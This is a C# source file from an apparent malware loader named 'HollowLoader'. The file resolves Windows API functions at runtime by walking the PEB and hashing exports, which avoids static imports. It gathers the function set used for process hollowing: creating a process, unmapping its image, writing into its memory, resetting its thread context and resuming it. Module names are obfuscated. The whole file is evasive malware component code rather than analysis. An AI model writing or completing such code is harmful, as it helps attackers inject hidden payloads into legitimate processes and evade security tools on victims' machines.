using System;
using System.Text;

namespace HollowLoader
{
    /// <summary>
    /// Resolved API surface. All function pointers are obtained at runtime via
    /// ApiResolver (PEB walk + export hashing), never via static imports.
    /// </summary>
    internal sealed class Win32
    {
        internal Native.GetModuleHandleWDelegate GetModuleHandleW;
        internal Native.LoadLibraryWDelegate LoadLibraryW;
        internal Native.VirtualAllocDelegate VirtualAlloc;
        internal Native.VirtualFreeDelegate VirtualFree;
        internal Native.VirtualProtectDelegate VirtualProtect;
        internal Native.CreateProcessWDelegate CreateProcessW;
        internal Native.GetThreadContextDelegate GetThreadContext;
        internal Native.SetThreadContextDelegate SetThreadContext;
        internal Native.ResumeThreadDelegate ResumeThread;
        internal Native.VirtualAllocExDelegate VirtualAllocEx;
        internal Native.VirtualProtectExDelegate VirtualProtectEx;
        internal Native.WriteProcessMemoryDelegate WriteProcessMemory;
        internal Native.ReadProcessMemoryDelegate ReadProcessMemory;
        internal Native.GetSystemDirectoryWDelegate GetSystemDirectoryW;
        internal Native.CloseHandleDelegate CloseHandle;
        internal Native.NtUnmapViewOfSectionDelegate NtUnmapViewOfSection;
        internal Native.NtQueryInformationProcessDelegate NtQueryInformationProcess;
        internal Native.NtWriteVirtualMemoryDelegate NtWriteVirtualMemory;

        internal static Win32 Resolve()
        {
            IntPtr kernel32 = ApiResolver.GetModuleBase(Obf.Kernel32Dll);
            IntPtr ntdll = ApiResolver.GetModuleBase(Obf.NtdllDll);
            if (kernel32 == IntPtr.Zero || ntdll == IntPtr.Zero)
                return null;

            var api = new Win32();
            api.GetModuleHandleW = ApiResolver.GetDelegate<Native.GetModuleHandleWDelegate>(kernel32, Native.H_GetModuleHandleW);
            api.LoadLibraryW = ApiResolver.GetDelegate<Native.LoadLibraryWDelegate>(kernel32, Native.H_LoadLibraryW);
            api.VirtualAlloc = ApiResolver.GetDelegate<Native.VirtualAllocDelegate>(kernel32, Native.H_VirtualAlloc);
            api.VirtualFree = ApiResolver.GetDelegate<Native.VirtualFreeDelegate>(kernel32, Native.H_VirtualFree);
            api.VirtualProtect = ApiResolver.GetDelegate<Native.VirtualProtectDelegate>(kernel32, Native.H_VirtualProtect);
            api.CreateProcessW = ApiResolver.GetDelegate<Native.CreateProcessWDelegate>(kernel32, Native.H_CreateProcessW);
            api.GetThreadContext = ApiResolver.GetDelegate<Native.GetThreadContextDelegate>(kernel32, Native.H_GetThreadContext);
            api.SetThreadContext = ApiResolver.GetDelegate<Native.SetThreadContextDelegate>(kernel32, Native.H_SetThreadContext);
            api.ResumeThread = ApiResolver.GetDelegate<Native.ResumeThreadDelegate>(kernel32, Native.H_ResumeThread);
            api.VirtualAllocEx = ApiResolver.GetDelegate<Native.VirtualAllocExDelegate>(kernel32, Native.H_VirtualAllocEx);
            api.VirtualProtectEx = ApiResolver.GetDelegate<Native.VirtualProtectExDelegate>(kernel32, Native.H_VirtualProtectEx);
            api.WriteProcessMemory = ApiResolver.GetDelegate<Native.WriteProcessMemoryDelegate>(kernel32, Native.H_WriteProcessMemory);
            api.ReadProcessMemory = ApiResolver.GetDelegate<Native.ReadProcessMemoryDelegate>(kernel32, Native.H_ReadProcessMemory);
            api.GetSystemDirectoryW = ApiResolver.GetDelegate<Native.GetSystemDirectoryWDelegate>(kernel32, Native.H_GetSystemDirectoryW);
            api.CloseHandle = ApiResolver.GetDelegate<Native.CloseHandleDelegate>(kernel32, Native.H_CloseHandle);
            api.NtUnmapViewOfSection = ApiResolver.GetDelegate<Native.NtUnmapViewOfSectionDelegate>(ntdll, Native.H_NtUnmapViewOfSection);
            api.NtQueryInformationProcess = ApiResolver.GetDelegate<Native.NtQueryInformationProcessDelegate>(ntdll, Native.H_NtQueryInformationProcess);
            api.NtWriteVirtualMemory = ApiResolver.GetDelegate<Native.NtWriteVirtualMemoryDelegate>(ntdll, Native.H_NtWriteVirtualMemory);

            return api;
        }

        /// <summary>Build a STARTUPINFO blob (zeroed) and return its unmanaged pointer.</summary>
        internal static IntPtr AllocStartupInfo()
        {
            int cb = IntPtr.Size == 8 ? 104 : 68;
            IntPtr p = System.Runtime.InteropServices.Marshal.AllocHGlobal(cb);
            byte[] zeros = new byte[cb];
            System.Runtime.InteropServices.Marshal.Copy(zeros, 0, p, cb);
            System.Runtime.InteropServices.Marshal.WriteInt32(p, cb); // cb field
            return p;
        }
    }
}
